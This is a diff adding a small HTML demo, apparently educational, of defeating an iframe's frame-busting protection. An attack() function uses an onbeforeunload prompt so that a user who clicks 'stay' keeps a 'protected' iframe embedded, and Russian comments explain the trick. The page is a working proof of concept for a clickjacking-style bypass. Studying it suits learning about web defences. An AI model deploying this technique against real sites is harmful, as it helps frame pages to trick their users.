@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>index.html</title>
+</head>
+<body>
+    <script>
+        function attack() {
+            window.onbeforeunload = function(event) {
+                window.onbeforeunload = null;
+                event.preventDefault();
+            };
+            let isIframeExists = document.querySelector('iframe');
+            if (isIframeExists) {
+                isIframeExists.remove();
+            }
+            document.body.insertAdjacentHTML('beforeend', '<iframe style="width: 400px" src="iframe.html"></iframe>')
+        }
+    </script>
+
+    <p>После клика на кнопку пользователь получает "странный" вопрос о том, хочет ли он покинуть данную страницу.</p>
+    <p>Скорее всего, он ответит "нет", и защита ифрейма будет взломана.</p>
+
+    <button style="display: block; margin-bottom: 0.5rem" onclick="attack()">Добавить "защищенный" ифрейм</button>
+</body>
+</html>
